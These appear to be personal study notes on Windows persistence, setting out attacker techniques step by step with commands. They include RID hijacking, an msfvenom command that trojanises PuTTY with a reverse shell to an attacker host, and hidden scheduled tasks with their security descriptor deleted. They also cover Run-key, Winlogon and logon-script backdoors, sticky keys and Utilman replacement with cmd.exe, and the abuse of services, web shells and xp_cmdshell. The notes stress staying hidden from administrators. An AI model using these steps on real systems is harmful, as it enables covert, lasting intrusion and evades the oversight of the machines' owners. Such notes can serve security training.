# Windows Persistence


## Account Tampering
Assume we've dumped password hashed of victim machine and successfully crack passwords for some unprivileged account(s).

What now?

### Reassign Groups
- Can add unpriv account to administrators group e.g. `net localgroup administrators <account-name> /add`, but this has poor OpSec
- Can add account to Backup Operators group instead - allows us to bypass DACL and read/write to files because we have the `SeBackupPrivilege` and `SeRestorePrivilege` privileges
    1. `net local group "Backup Operators" <account-name> /add`
    2. Need to add account to `Remote Management Users` group to allow us to RDP/WinRM back into machine
    3. When you RDP into the account, you maintain admin privileges. When you WinRM back into it, you don't.
        1. This is because of user access control mechanisms because the `LocalAccountTokenFilterPolicy` registry is set to `0`:
        2. Need to set this value to `1`. This removes user access control restrictions and allows admin rights when WinRM'ing back into machine.
        3. Command for above: `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`
    4. Login


### Special Privileges

More discreet but requires a PowerShell and GUI:
1. Export current configuration - `secedit /export /cfg config.inf`
2. Add user to `SeBackupPrivilege` and `SeRestorePrivilege` rights using comma separation.
3. Do some unnecessary steps to:
    - convert config to secure DB - `secedit /import config.inf /db config.sdb`
    - configure system from secure DB - `secedit /configure /db config.sdb /cfg config.inf`
4. With PowerShell in a GUI session enter `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI` and add user and grant them 'Full Control - Allow' in GUI window.
5. Do `LocalAccountTokenFilterPolicy` value reassignment as in above section to allow admin privileges over WinRM.


### RID Hijacking

*(also requires GUI)*

Relative ID (RID) ≈ Windows equiavelent of Linux UID.

LSASS (Local Security Authorization Subsystem Service) uses RIDs from SAM hive when user logs in to assign access token.

Idea: change this on low privilege account to same as administrator (default: 500).

```
C:\> wmic useraccount get name, sid      # List names and SIDs which include RIDs -  Record yours and admin's
C:\> psexec.exe -i -s regedit            # Open regedit in GUI
```
Convert your RID into hex. Find RID in regedit (note, little-endian representation so hex value of D629 is 29D6). Replace bytes with admin RID. Log into machine.


## File Backdooring

### Executables

Modify the executable .exe files using `msfvenom`. E.g. modify PuTTY such that it still functions as regular PuTTY would, but also executes a silent payload in the background to send reverse shell or some other action.

Achieved by:
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp LHOST=<ATTACK_IP> RHOST=<ATTACK_PORT> -b "\x00" -f exe -o puttyX.exe`
- `puttyX.exe` is the infected file.

### Shortcuts

Modifying shortcuts themselves is sneakier. Change the executable path it points to so that it points to a malicious executable instead, e.g. a PowerShell script which runs the regular executable as well as a backdoor/reverse shell.

### File Associations

Different file types have different 'file associations'. This describes how they behave when a file of that file type is executed. E.g. when a `.txt` file is opened, it runs a script which opens Notepad. This script can be altered to do same as above: function normally but also silently execute backdoor payload. Can do PowerShell to achieve this. 

This data is stored in `HKLM\Software\Classes` and then look for file type e.g. `HKLM\Software\Classes\.txt` - the  `ProgID` (Programmatic ID: identifier to a program installed on the system) subkey will be listed in the registry editor window (in this case `txtfile`).

Search for this subkey in the same registry editor path (`HKLM\Software\Classes\ttxtfile`) and modify the script there.

Note: the `%1` denotes an argument which is passed at runtime (e.g. the name of a file to be opened by the txtfile program). In PowerShell, this is referred to as `$args[0]`.


## Service Backdooring

### Create

Create service using
```
sc.exe create <service_name> binPath=<execute> start=auto
sc.exe start <service_name>
```
- `<execute>` can be either the path to an executable or an OS command
- remember the executable has to implement a protocol specific to Windows services
- noisy

### Modify

Try to modify an existing service such that the following parameters match the values:
- `BINARY_PATH_NAME`: `<path_to_payload>`
- `START_TYPE`: `AUTO_START`
- `SERVICE_START_NAME`: `LocalSystem`

This can be achieved by:
```
sc.exe config <service_name> binPath=<path_to_payload> start=auto obj="LocalSystem"
```


## Scheduled Task Backdooring

Create scheduled tasks by executing
```
schtasks /create /sc minute /mo 1 /tn <task_name> /tr <command> /ru SYSTEM
```
- `/sc`, `/mo` specify to run every minute
- `/tn` task name
- `/tr` task run (OS command to run)
- `/ru` run as user

For way better OpSec, delete the created scheduled task's security descriptor:
- This prevents any user (including administrators) from having visibility on it
- Can be achieved via:
    1. Registry editor: `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Schedule\TaskCache\Tree\<task_name>`
    2. Delete SD value(security descriptor)
- Every scheduled task has this
- **Requires SYSTEM privileges to do this** - might need to open regedit with PsExec?


## Logon-Triggered Persistence

### StartUp Directory

Files in the directory `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\` are executed on user login (from any user logging into that machine). Can abuse this by dropping reverse shell here.

### Run & RunOnce

There are 4 Registry Key entries we can abuse to trigger reverse shells or other backdooring payloads:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`

HKLM = Local Machine

HKCU = Current User

For any of these registry keys, you can navigate to it and create a new registry entry (any name) of data type `REG_EXPAND_SZ` with data of path of payload to be executed.

### Winlogon

This is the component that is triggered just after authentication on logon.
- Located at: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon`.
- We can alter the executable paths of the `Userinit` (restores user-specific profile preferences) and `Shell` (path to user's shell).
- **BUT!** Changing these values will break login sequence, so instead we can append the malicious executable to the original executable path by comma-separation (,). 

### UserInitMprLogonScript

`UserInitMprLogonScript` is a registry entry for an environment variable which is checked when user profile preferences are loaded from the aforementioned `Userinit` function.

There is nothing set by default so we can make a new entry under `HKCU\Environment` using the EXACT NAME `UserInitMprLogonScript` and provide a path to a backdoor payload.

This backdoor will only work for when the current user logs on; there is no `HKLM` equivalent.


## Login Screen & RDP Backdooring

### Sticky Keys

The sticky keys message when you spam shift 5 times is a binary located at `C:\Windows\System\sethc.exe` - if we replace this binary with a copy of `cmd.exe`, then instead a command shell will be spawned when we spam shift. **This can be triggered even before logging in with credentials on the login page**.
- To do this, need to first *take ownership* of the `sethc.exe` file: `takeown /f C:\Windows\System32\sethc.exe`
- Then need to grant permissions to curent user to be able to mofify files: `icacls C:\Windows\System32\sethc.exe /grant <user>:F`
- Command prompt spawned will be as user NT AUTHORITY\SYSTEM

### Utilman

Similar to above, but `cmd.exe` is executed when clicking the "Ease of Access" settings button in the logon page. This functionality executes `C:\Windows\System32\Utilman.exe`, so apply same process as above:
```
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant <user>:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```


## Other Methods

### Web Shells

Abusing web shells can grant persistence. On IIS, the user the web shell runs under has the `SeImpersonateUser` privilege which can be used for privilege escalation.

### MSSQL Server

Triggers can invoke OS commands, so reverse shells (PowerShell) can be exploited. Need to enable the `xp_cmdshell` stored procedure in config to allow this interactivity.